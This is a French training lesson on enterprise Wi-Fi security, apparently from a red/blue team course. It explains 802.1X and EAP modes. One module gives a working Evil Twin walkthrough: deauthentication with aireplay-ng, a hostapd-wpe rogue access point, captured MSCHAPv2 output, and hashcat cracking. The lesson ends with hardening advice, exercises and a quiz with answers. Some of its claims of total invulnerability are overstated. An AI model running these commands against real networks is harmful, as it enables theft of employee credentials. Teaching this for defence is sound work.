# TOME P5 — Cybersécurité Avancée & Red/Blue Team — Jour 206 (6h) : Sécurité Wi-Fi Avancée & Attaques Réseau Sans-Fil (WPA2/WPA3 Enterprise, 802.1X EAP-TLS, Rogue AP / Evil Twin & Aircrack-ng)

> [!NOTE]
> **Objectif du jour :** Maîtriser l'évaluation de la sécurité des réseaux sans-fil d'entreprise : fonctionnement de **WPA2/WPA3 Enterprise** avec **802.1X EAP-TLS**, capture et cassage du **Handshake WPA2 4-Way**, attaque par point d'accès malveillant (**Evil Twin / Rogue AP**), interception de jetons d'authentification **EAP-TTLS/PEAP**, et durcissement des architectures Wi-Fi d'entreprise.
>
> **Compétences visées :** `SEC-06` (A) — Audits Wi-Fi & Attaques Réseau Sans-Fil | `SEC-04` (A) — Sécurité Wi-Fi 802.1X & EAP-TLS

---

## 1) Module — Protocole 802.11 & WPA2/WPA3 Enterprise (2h)

### 📖 Narration/Intuition

Les réseaux Wi-Fi personnels utilisent **WPA2-Personal (PSK)** avec un mot de passe unique partagé par tous les utilisateurs. Pour une banque comme la BCC, ce mode est un désastre sécuritaire : si un employé quitte l'entreprise, il faut changer le mot de passe sur des centaines d'équipements.

Les réseaux Wi-Fi d'entreprise utilisent **WPA2/WPA3 Enterprise (802.1X)** : chaque utilisateur s'authentifie avec ses propres identifiants (nom d'utilisateur/mot de passe AD ou certificat numérique X.509) auprès d'un serveur d'authentification centralisé **RADIUS (Remote Authentication Dial-In User Service)**.

### 🔍 Anatomie Technique

**Architecture Wi-Fi 802.1X avec RADIUS :**

```
 ┌─────────────────┐       1. Demande d'accès 802.1X      ┌──────────────────┐
 │ Supplicant      │─────────────────────────────────────►│ Authenticator    │
 │ (Client Laptop) │                                      │ (AP Wi-Fi / WLC) │
 └─────────────────┘                                      └────────┬─────────┘
         ▲                                                         │ 2. Envoi EAP-Request
         │                                                         │    via RADIUS
         │                                                         ▼
         │ 3. Validation des identifiants (EAP-TLS/PEAP)  ┌──────────────────┐
         └────────────────────────────────────────────────│ RADIUS Server    │
                                                          │ (FreeRADIUS / NPS│
                                                          └────────┬─────────┘
                                                                   │ 4. Vérification
                                                                   ▼
                                                          ┌──────────────────┐
                                                          │ Active Directory │
                                                          └──────────────────┘
```

**Types de Chiffrement EAP (Extensible Authentication Protocol) :**
- **EAP-TLS** : Le mode le plus sécurisé. Client ET Serveur s'authentifient mutuellement avec des certificats numériques X.509 (mTLS). Aucun mot de passe n'est transmis sur l'air.
- **PEAP / EAP-TTLS** : Le serveur RADIUS présente un certificat TLS pour créer un tunnel chiffré, puis l'utilisateur transmet son login/mot de passe AD dans ce tunnel (EAP-MSCHAPv2). Vulnérable aux attaques **Evil Twin** si le client ne valide pas strictement le certificat du serveur.

---

## 2) Module — Attaque 4-Way Handshake & Evil Twin (2h)

### 📖 Narration/Intuition

L'attaque **Evil Twin (Rogue AP)** consiste à déployer un point d'accès Wi-Fi pirate diffusant exactement le même nom de réseau (SSID) et la même adresse MAC (BSSID) que le réseau officiel de la BCC, avec une puissance de signal supérieure.

Lorsque les appareils des employés se connectent automatiquement à cet Evil Twin, le point d'accès pirate intercepte le tunnel PEAP/EAP-TTLS et capture les hashes de mots de passe AD (**MSCHAPv2**) qu'il peut ensuite casser hors-ligne avec Hashcat.

### 🔍 Anatomie Technique

**Déroulement de l'Attaque Evil Twin avec Hostapd-WPE :**

```bash
# 1. Passer la carte Wi-Fi en mode Monitor avec airmon-ng
sudo airmon-ng start wlan0

# 2. Capturer le trafic réseau pour identifier le BSSID et le canal Wi-Fi BCC
sudo airodump-ng wlan0mon

# 3. Lancer la dé-authentification des clients légitimes (Forcer le re-connect)
sudo aireplay-ng --deauth 10 -a 00:11:22:33:44:55 wlan0mon

# 4. Configurer Hostapd-WPE (Wireless Pwnage Edition) pour simuler l'AP BCC
# (Fichier : /etc/hostapd-wpe/hostapd-wpe.conf)
# ssid=BCC-Corporate-WiFi
# channel=6
# eap_user_file=/etc/hostapd-wpe/hostapd-wpe.eap_user

# 5. Démarrer l'Evil Twin Hostapd-WPE
sudo hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf

# Résultat : Lorsqu'un employé s'y connecte, Hostapd-WPE intercepte le challenge MSCHAPv2 !
# Output :
#   mschapv2: username: kabilaj
#   challenge: 1122334455667788
#   response: a1b2c3d4e5f67890...
```

**Cassage du Hash MSCHAPv2 avec Hashcat :**

```bash
# Cassage du hash MSCHAPv2 intercepté (Mode Hashcat 5500)
hashcat -m 5500 -a 0 mschapv2_hash.txt /usr/share/wordlists/rockyou.txt
```

---

## 3) Module — Durcissement & Prévention Wi-Fi 802.1X (2h)

### 📖 Narration/Intuition

Comment l'équipe Blue Team de la BCC peut-elle protéger totalement les équipements de l'entreprise contre les attaques par Evil Twin et l'interception de mots de passe Wi-Fi ?

La réponse est le déploiement du protocole **802.1X EAP-TLS avec certificats obligatoires**.

### 🛠️ Atelier Pratique

**Recommandations de Sécurisation Wi-Fi d'Entreprise :**

```markdown
# GUIDE DE HARDENING WI-FI D'ENTREPRISE — BCC

1. **DÉPLOIEMENT EAP-TLS (Certificats Obligatoires)**
   - Abandonner PEAP/EAP-MSCHAPv2 au profit d'**EAP-TLS**.
   - Chaque ordinateur de l'entreprise doit posséder un certificat X.509 unique émis par la PKI interne (cert-manager/Active Directory Certificate Services).
   - Sans certificat client valide sur son ordinateur, il est **impossible** pour un attaquant de se connecter au réseau Wi-Fi, même s'il connaît le mot de passe de l'utilisateur.

2. **VALIDATION STRICTE DU CERTIFICAT SERVEUR (Protection Anti-Evil Twin)**
   - Configurer la politique GPO (Group Policy Object) sur tous les postes Windows :
     - Cocher : "Validate server certificate"
     - Sélectionner uniquement la Root CA officielle de la BCC.
     - Spécifier le nom du serveur RADIUS autorisé (`radius.bcc.cd`).
   - Empêcher l'utilisateur de cliquer sur "Ignorer l'avertissement de certificat".

3. **ACTIVATION WPA3-ENTERPRISE & 802.11w (Protected Management Frames)**
   - Activer **802.11w (PMF)** : chiffre les trames de gestion (Deauthentication frames).
   - Bloque les attaques de dé-authentification de masse menées par `aireplay-ng`.

4. **WIPS (Wireless Intrusion Prevention System)**
   - Déployer des sondes WIPS sur les APs Wi-Fi pour détecter la présence de points d'accès malveillants (Rogue APs) diffusant le même SSID et alerter immédiatement le SOC.
```

---

## 🏅 Nouvelles Abréviations Rencontrées

| Abréviation | Signification |
|:---:|:---|
| **EAP** | Extensible Authentication Protocol — Framework d'authentification pour réseaux 802.1X |
| **RADIUS** | Remote Authentication Dial-In User Service — Serveur centralisé d'authentification |
| **PMF** | Protected Management Frames (802.11w) — Chiffrement des trames de gestion Wi-Fi |
| **WIPS** | Wireless Intrusion Prevention System — Système de prévention des intrusions sans-fil |
| **BSSID** | Basic Service Set Identifier — Adresse MAC physique du point d'accès Wi-Fi |

---

## 🏋️ Exercices & Corrigés

**Exercice 1 :** Pourquoi le protocole **EAP-TLS** est-il totalement invulnérable aux attaques de type **Evil Twin / Rogue AP** contrairement au protocole **PEAP-MSCHAPv2** ?

**Corrigé :** Dans **PEAP-MSCHAPv2**, seul le serveur RADIUS présente un certificat TLS. Le client s'authentifie en envoyant ses identifiants (login/mot de passe AD sous forme de hash MSCHAPv2) à l'intérieur du tunnel. Si le client n'est pas configuré pour valider strictement le certificat du serveur, il acceptera de se connecter à l'**Evil Twin**, lui transmettant ainsi son hash MSCHAPv2. Dans **EAP-TLS**, l'authentification est **mutuelle par certificats X.509** (mTLS) : le client valide le certificat du serveur RADIUS, ET le serveur RADIUS exige la présentation d'un **certificat client valide** signé par la PKI de l'entreprise. Un attaquant qui déploie un Evil Twin ne possède pas la clé privée de la Root CA officielle pour émettre un faux certificat serveur valide, ET il ne possède pas de certificat client valide pour s'authentifier auprès du vrai réseau. L'attaque Evil Twin échoue donc instantanément dans les deux sens.

**Exercice 2 :** Quel est le rôle de la norme **IEEE 802.11w (Protected Management Frames - PMF)** et quelle attaque Wi-Fi classique permet-elle d'annuler ?

**Corrigé :** Historiquement dans les normes Wi-Fi (802.11a/b/g/n/ac), les trames de gestion réseau (management frames, notamment les trames de dé-authentification et de dé-association) étaient transmises **en clair et non signées**, même sur un réseau chiffré WPA2. Un attaquant pouvait donc envoyer des paquets de dé-authentification forgés avec l'adresse MAC usurpée du point d'accès (`aireplay-ng --deauth`) pour déconnecter tous les clients à portée. La norme **IEEE 802.11w (PMF)** introduit la signature et le chiffrement des trames de gestion. Lorsque PMF est activé et obligatoire (obligatoire dans WPA3), le client Wi-Fi rejette toutes les trames de dé-authentification qui ne sont pas cryptographiquement signées par le point d'accès légitime, annulant ainsi complètement les attaques par dé-authentification.

---

## ❓ Banque de Questions & Test du Jour

**Q1 :** Quel protocole standard d'authentification réseau (802.1X) est utilisé dans les réseaux Wi-Fi d'entreprise pour valider chaque utilisateur individuellement auprès d'un serveur RADIUS ?
- A) WPA2/WPA3 Enterprise
- B) WPA2-Personal (PSK)
- C) WEP
- D) WPS

**Réponse : A**

**Q2 :** Quelle est l'attaque Wi-Fi consistant à déployer un point d'accès pirate diffusant le même nom de réseau (SSID) que le réseau officiel de l'entreprise avec une puissance de signal supérieure pour intercepter les connexions des clients ?
- A) Evil Twin (Rogue AP)
- B) SQL Injection
- C) Buffer Overflow
- D) ARP Poisoning

**Réponse : A**

**Q3 :** Quel mode d'authentification EAP est le plus sécurisé car il exige une authentification mutuelle par certificats numériques X.509 (mTLS) entre le client et le serveur RADIUS ?
- A) EAP-TLS
- B) PEAP-MSCHAPv2
- C) EAP-GTC
- D) LEAP

**Réponse : A**

**Q4 :** Quelle norme Wi-Fi (802.11w) protège les trames de gestion contre les attaques de dé-authentification menées avec des outils comme `aireplay-ng` ?
- A) Protected Management Frames (PMF)
- B) WPA-PSK
- C) WPS
- D) SSID Broadcasting

**Réponse : A**

**Q5 :** Quel outil open-source d'injection et de capture Wi-Fi est utilisé dans la suite Aircrack-ng pour envoyer des trames de dé-authentification aux clients cibles ?
- A) `aireplay-ng`
- B) `airodump-ng`
- C) `aircrack-ng`
- D) `airmon-ng`

**Réponse : A**

---

*(Le composant d'évaluation exigeant 75% minimum s'affiche ci-dessous)*
